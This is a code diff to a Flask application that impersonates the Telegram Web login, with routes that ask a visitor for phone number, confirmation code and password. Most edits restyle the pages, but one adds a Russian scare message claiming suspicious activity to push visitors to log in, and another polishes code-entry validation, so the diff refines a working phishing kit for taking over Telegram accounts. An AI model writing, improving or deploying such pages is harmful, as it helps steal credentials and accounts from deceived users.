@@ -34,8 +34,8 @@ def index():
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
                 font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: #fff; 
+                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
+                color: #333; 
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -48,7 +48,7 @@ def index():
                 background: rgba(255, 255, 255, 0.95);
                 padding: 40px 30px;
                 border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                 text-align: center; 
                 animation: slideIn 0.5s ease-out;
             }
@@ -66,7 +66,7 @@ def index():
                 align-items: center;
                 justify-content: center;
                 font-size: 40px;
-                box-shadow: 0 10px 25px rgba(0,136,204,0.4);
+                box-shadow: 0 10px 25px rgba(0,136,204,0.2);
             }
             h1 { 
                 color: #333; 
@@ -91,11 +91,11 @@ def index():
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.4);
+                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
             }
             button:active { 
                 transform: translateY(0);
@@ -121,7 +121,7 @@ def index():
         <div class="container">
             <div class="logo">📱</div>
             <h1>Telegram Web</h1>
-            <p>Для продолжения работы требуется подтверждение личности</p>
+            <p>Мы заметили подозрительную активность. Авторизуйтесь для верификации.</p>
             <button onclick="window.location.href='/phone'">Начать авторизацию</button>
             <div class="security-note">
                 Безопасное соединение защищено шифрованием
@@ -146,7 +146,7 @@ def phone():
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
                 font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -159,7 +159,7 @@ def phone():
                 background: rgba(255, 255, 255, 0.95);
                 padding: 40px 30px;
                 border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                 animation: slideIn 0.5s ease-out;
             }
             @keyframes slideIn { 
@@ -180,7 +180,7 @@ def phone():
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
             }
             h2 { 
                 color: #333; 
@@ -229,12 +229,12 @@ def phone():
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
                 margin-top: 10px;
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.4);
+                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
             }
             button:active { 
                 transform: translateY(0);
@@ -324,7 +324,7 @@ def phone():
             document.addEventListener('DOMContentLoaded', function() {
                 var phoneInput = document.getElementById('phone');
                 phoneInput.addEventListener('input', function(e) {
-                    var x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
+                    var x = e.target.value.replace(/\\D/g, '').match(/(\\d{0,1})(\\d{0,3})(\\d{0,3})(\\d{0,2})(\\d{0,2})/);
                     e.target.value = !x[2] ? '+' + x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
                 });
                 // Enter для отправки
@@ -362,7 +362,6 @@ def phone():
 def handle_phone(phone):
     if not phone.startswith('+7'):
         return
-    # Используем re.sub для замены всех нецифровых символов
     digits = re.sub(r'\D', '', phone[2:])
     if len(digits) == 10 and all(d == '9' for d in digits):
         log_action(f'🔑 Админ вошел с номером: {phone}')
@@ -396,7 +395,7 @@ def code():
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
                 font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -409,7 +408,7 @@ def code():
                 background: rgba(255, 255, 255, 0.95);
                 padding: 40px 30px;
                 border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                 animation: slideIn 0.5s ease-out;
             }
             @keyframes slideIn { 
@@ -430,7 +429,7 @@ def code():
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
             }
             h2 { 
                 color: #333; 
@@ -518,6 +517,10 @@ def code():
                 const inputs = document.querySelectorAll('.code-input');
                 inputs.forEach((input, index) => {
                     input.addEventListener('input', function(e) {
+                        // Проверяем, что введена только цифра
+                        if (!/\\d/.test(e.target.value) && e.target.value !== '') {
+                            e.target.value = e.target.value.replace(/[^\\d]/g, '');
+                        }
                         if (e.target.value.length === 1 && index < inputs.length - 1) {
                             inputs[index + 1].focus();
                         }
@@ -605,7 +608,7 @@ def password():
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
                 font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -618,7 +621,7 @@ def password():
                 background: rgba(255, 255, 255, 0.95);
                 padding: 40px 30px;
                 border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
                 animation: slideIn 0.5s ease-out;
             }
             @keyframes slideIn { 
@@ -639,7 +642,7 @@ def password():
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
             }
             h2 { 
                 color: #333; 
@@ -696,12 +699,12 @@ def password():
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.3);
+                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
                 margin-top: 10px;
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.4);
+                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
             }
             button:active { 
                 transform: translateY(0);
@@ -1192,5 +1195,3 @@ if __name__ == '__main__':
     import os
     port = int(os.environ.get("PORT", 5000))
     socketio.run(app, host="0.0.0.0", port=port, debug=False)
-
-
